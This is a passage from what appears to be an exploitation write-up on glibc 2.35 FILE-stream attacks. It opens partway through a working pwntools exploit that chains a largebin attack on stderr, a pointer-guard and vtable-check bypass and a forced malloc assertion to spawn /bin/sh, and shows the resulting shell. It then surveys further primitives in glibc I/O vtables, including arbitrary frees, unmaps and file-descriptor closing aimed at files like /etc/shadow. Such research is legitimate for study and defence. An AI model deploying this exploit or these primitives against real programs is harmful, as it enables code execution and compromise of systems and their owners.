    # Note that in this particular glibc 2.35 build we have tcache enabled.
    
    target = largebin_offset(libc.sym.stderr) # we will target stderr pointer to unleash a House of Kiwi style attack inorder to execute our fake FILE stream. 
    # note that as I commented in the source code, stderr must not be used in main! Because then stderr will be located in the data section of our program.
    # Although there is still a way to exploit the program, even with stderr being used inside our code.
    # We can overwrite the stderr _chain pointer and upon exit our fake FILE stream will be triggered.
    # But this requires our fake FILE streams to not be corrupted until _IO_cleanup
    # In our case we cannot exit the program so this will not work in our case.
    # This is the main drawback of this technique we have to rely on some mechanism that will trigger our fake FILE stream.
    
    _locker = libc.address + 0x1f21f8
    
    _IO_UNBUFFERED = 0x0002
    
    pointer_guard = libc.address - 0x2890
    
    what = libc.sym._IO_vtable_check # we want to defeat vtable check.
    where = pointer_guard
    
    what2 = libc.sym.system # this will have both the effect of zeroing out the least significant byte of &stderr, pointing back to a different location in the heap but also will have a purpose as a fake vtable in our final stage. 
    where2 = libc.sym.stderr - 7
    
    # we want to craft our fake FILE stream first.
    fake_fs = FileStructure(null = _locker)
    fake_fs.vtable = libc.sym._IO_mem_jumps + (0x60 - 0x38) # __overflow => _sync => _IO_mem_sync ;)
    
    fake_fs._IO_save_end = (libc.sym.stderr - 7) - 0x60 # this will be our fake vtable in our final fake FILE stream.
    
    fake_fs = bytes(fake_fs)
    
    fake_fs = fake_fs[0x10:] + p64(0)*2 + p64(where) + p64(where2)
    
    final_fake_fs = p8(0x0)*0x60 + b'/bin/sh\x00'
    
    pwnie_land_final_fake_fs = add_pwnie_land(pwnie_land_size = 0xd0, pwnie_land_contents=final_fake_fs)
    pwnie_land_overflow_A = add_pwnie_land(pwnie_land_size = 0x20, pwnie_land_contents=b'Corrupt the evil')
    pwnie_land_A = add_pwnie_land(pwnie_land_size = 0x820, pwnie_land_contents=fake_fs)
    pwnie_land_B = add_pwnie_land(pwnie_land_size=0x70, pwnie_land_contents=b'This pwnie land chunk will be used to corrupt pwnie_land_C->bk_nextsize pointer') # this will take a guard chunk role also.
    pwnie_land_C = add_pwnie_land(pwnie_land_size = 0x830, pwnie_land_contents=b'I am read to unleash a deadly large bin attack!')
    pwnie_land_guard_C = add_pwnie_land(pwnie_land_size = 0x40, pwnie_land_contents=b'Waiting to trigger our deadly FSOP!')
    
    # Initiate our large bin attack.
    burn_pwnie_land(pwnie_land_C) # free the biggest large chunk.
    
    # currently chunk 0x830 is linked in unsortedbin list, let's sort it to large bin list.
    pwnie_land_sorter_chunk = add_pwnie_land(pwnie_land_size=0x840, pwnie_land_contents=b'blah blah')
    burn_pwnie_land(pwnie_land_A) # free the smallest large chunk.
    
    burn_pwnie_land(pwnie_land_B) # we free this chunk inorder to overflow to pwnie_land_C and hijack bk_nextsize pointer.
    
    pwnie_land_B = add_pwnie_land(pwnie_land_size=0x70, pwnie_land_contents=b'A'*0x60 + p64(0x0) + p64(0x830) + p64(0x0) + p64(0x0) + p64(0x0) + p64(target))
    
    pwnie_land_sorter_chunk = add_pwnie_land(pwnie_land_size=0x840, pwnie_land_contents=p8(0)*0x838 + p64(0x0)) # we also want to corrupt top chunk pointer inorder to trigger sysmalloc
    # stderr now points back to our pwnie_land_C chunk.
    
    # before unleashing the true evil we need to fix some things first because stderr's _IO_write_ptr and _IO_write_base are not controlable from us.
    # we will trigger another heap overflow to fix those.
    burn_pwnie_land(pwnie_land_overflow_A)
    
    fix_flags = p64(_IO_UNBUFFERED) # we want to add _IO_UNBUFFERED inorder to call buffered_vfprintf!
    fix_IO_read_ptr = p64(_locker) # this will be the _locker of our final fake FILE stream. 
    fix_IO_read_end = p64(0x0)
    fix_IO_read_base = p64(0x0)
    fix_IO_write_base = what
    fix_IO_write_ptr = fix_IO_write_base + what2
    
    fix_IO_write_base = p64(fix_IO_write_base)
    fix_IO_write_ptr = p64(fix_IO_write_ptr)
    
    fixes = fix_flags + fix_IO_read_ptr + fix_IO_read_end + fix_IO_read_base + fix_IO_write_base + fix_IO_write_ptr
    pwnie_land_overflow_A = add_pwnie_land(pwnie_land_size=0x20, pwnie_land_contents = p8(0x0)*0x10 + fixes)
    
    # last step we want to trigger our fake FILE stream through __malloc_assert
    # to trigger a our fake FILE stream, essentially we need to trigger any malloc assertion.
    # The easiest way in our PoC is corrupting the top chunk.
    
    # we have already corrupted top chunk size so we only need to trigger it.
    pwnie_land_assert_starter = add_pwnie_land(pwnie_land_size=0x840, pwnie_land_contents=b'Unleash the evil _IO_mem_sync spirit!') 
    
    # __malloc_assert is called now, the beasts are unleashed! Corrupt the pwnie land and give us freedom!

io = start()

io.recvuntil(b'@ The ASLR god gifted you a present for your adventure: ') # skip blah blah
puts_leak = int(io.recvline(keepends = False), base = 16)
success(f'puts @ 0x{puts_leak:02x}')

libc.address = puts_leak - libc.sym.puts
success(f'libc @ 0x{libc.address:02x}')

house_of_error() # unleash the beast!

io.interactive()
```
```python
[+] puts @ 0x7fd7caa6ce80
[+] libc @ 0x7fd7ca9f3000
[*] Switching to interactive mode
/bin/sh: 1: Unleash: not found
$ id
uid=1000(pwnie) gid=1000(pwnie) groups=1000(pwnie)
$  
```

# Other interesting FILE stream primitives.
Besides `_IO_mem_sync` I found some other FSOP primitives that might be useful in some cases. 

# _IO_cookie_jumps/ _IO_wfile_jumps
Abusing `_IO_cookie_jumps` is a well known technique for FSOP primitives, the House of Emma actually is abusing this to spawn a shell in a very similar manner with the above described House. But it can be useful to us also. Even though we do not need to play with `_IO_cookie_jumps` because we can bypass the vtable check and perform a classical FSOP with `_IO_mem_sync`, in some scenarios we might be unable to craft a fake vtable somewhere. If it is the case we can defeat the pointer guard with one arbitrary write and after that we could craft a new FILE stream with `_IO_cookie_jumps` as a vtable and supply our `system` as a function pointer in our `_IO_cookie_file`.

Same thing with ` _IO_wfile_jumps`, defeating the pointer guard can give you the ability to inject your own function pointers. Actually this set of functions is useful for glibc <= 2.29 where there was no pointer guard protection and you could easily get code execution from them like `_IO_str_jumps` in glibc 2.24.

# _IO_mem_finish/_IO_wmem_finish primitive.
`_IO_mem_jumps` also include besides `_IO_mem_sync` another one interesting primitive:
```c
static void
_IO_mem_finish (FILE *fp, int dummy)
{
  struct _IO_FILE_memstream *mp = (struct _IO_FILE_memstream *) fp;

  *mp->bufloc = (char *) realloc (fp->_IO_write_base,
				  fp->_IO_write_ptr - fp->_IO_write_base + 1);
  if (*mp->bufloc != NULL)
    {
      (*mp->bufloc)[fp->_IO_write_ptr - fp->_IO_write_base] = '\0';
      *mp->sizeloc = fp->_IO_write_ptr - fp->_IO_write_base;

      fp->_IO_buf_base = NULL;
    }

  _IO_str_finish (fp, 0);
}
```
Here you have the ability to basically perform whatever heap operation you want because you fully control the arguments of `realloc`. If we don't choose to perform a `free` and our operation returns something other than `NULL` we will have also as a bonus an arbitrary write but with a limited value, because if the difference `_IO_write_ptr - _IO_write_base` is too big probably `realloc` will fail and return a `NULL`.

Whatever operation we decide to perform with our `_IO_mem_finish` primitive eventually `_IO_str_finish` will be called.
```c
void
_IO_str_finish (FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    free (fp->_IO_buf_base);
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```
Here I've to note that if we choose to perform a `free` with `realloc` or our allocation was unsuccessful the `_IO_buf_base` will be not nulled and we will have an arbitrary free.
After that we entering `_IO_default_finish`:
```c
void
_IO_default_finish (FILE *fp, int dummy)
{
  struct _IO_marker *mark;
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    {
      free (fp->_IO_buf_base);
      fp->_IO_buf_base = fp->_IO_buf_end = NULL;
    }

  for (mark = fp->_markers; mark != NULL; mark = mark->_next)
    mark->_sbuf = NULL;

  if (fp->_IO_save_base)
    {
      free (fp->_IO_save_base);
      fp->_IO_save_base = NULL;
    }

  _IO_un_link ((struct _IO_FILE_plus *) fp);

#ifdef _IO_MTSAFE_IO
  if (fp->_lock != NULL)
    _IO_lock_fini (*fp->_lock);
#endif
}
```
Here we will have another arbitrary free if we provide a not NULL value to `_IO_save_base`.
In total if we wish we can have three arbitrary frees which are enough to bypass and craft a double free attack.

# _IO_file_close /_IO_file_close_mmap primitive
This primitive is quite interesting but not so useful by herself:
```c
int
_IO_file_close_mmap (FILE *fp)
{
  /* In addition to closing the file descriptor we have to unmap the file.  */
  (void) __munmap (fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);
  fp->_IO_buf_base = fp->_IO_buf_end = NULL;
  /* Cancelling close should be avoided if possible since it leaves an
     unrecoverable state behind.  */
  return __close_nocancel (fp->_fileno);
}
```
With this primitive you can do two interesting things:
* Perform an arbitrary unmap
* Close any file descriptior you like

If an `mmap` is following after your arbitrary unmap and you can control the contents of this `mmap` operation you might be able to get code execution by mapping again the GOT table for example. 

With this primitive you can also close an arbitrary file descriptor which can be very useful if the program opens a new file after that. We can close for example the `stdin`/`stdout`/`stderr` and after we open the new file with can read/write from our newly opened file stream indirectly via any IO operation on our closed standard file descriptor. 

For example say that we have a program running as root, we execute our `_IO_file_close `/`_IO_file_close_mmap` primitive by corrupting a FILE stream and we choose to close `stdout`. After that we open `/etc/shadow` inorder to write something. If the program tries to write something to `stdout` it will be redirected to `/etc/shadow`. It is a well known technique but we can perform it unintentionally through `_IO_file_close`/`_IO_file_close_mmap`.  

# _IO_strn_overflow/_IO_wstrn_overflow primitive
```c
typedef struct
{
  _IO_strfile f;
  /* This is used for the characters which do not fit in the buffer
     provided by the user.  */
  char overflow_buf[64];
} _IO_strnfile;
```
```c
static int
_IO_strn_overflow (FILE *fp, int c)
{
  /* When we come to here this means the user supplied buffer is
     filled.  But since we must return the number of characters which
     would have been written in total we must provide a buffer for
     further use.  We can do this by writing on and on in the overflow
     buffer in the _IO_strnfile structure.  */
  _IO_strnfile *snf = (_IO_strnfile *) fp;
  if (fp->_IO_buf_base != snf->overflow_buf)
    {
      /* Terminate the string.  We know that there is room for at
         least one more character since we initialized the stream with
         a size to make this possible.  */
      *fp->_IO_write_ptr = '\0';
      _IO_setb (fp, snf->overflow_buf,
                snf->overflow_buf + sizeof (snf->overflow_buf), 0);
      fp->_IO_write_base = snf->overflow_buf;
      fp->_IO_read_base = snf->overflow_buf;
      fp->_IO_read_ptr = snf->overflow_buf;
      fp->_IO_read_end = snf->overflow_buf + sizeof (snf->overflow_buf);
    }
  fp->_IO_write_ptr = snf->overflow_buf;
  fp->_IO_write_end = snf->overflow_buf;
  /* Since we are not really interested in storing the characters
     which do not fit in the buffer we simply ignore it.  */
  return c;
}
```
This actually is not very useful but still you can perform at least something. If you can satisfy the condition `fp->_IO_buf_base != snf->overflow_buf` you can perform an arbitrary null byte primitive. I would like to see a shell abusing this primitive ;)

And many other... Probably there are other primitives that you can find in glibc's vtables...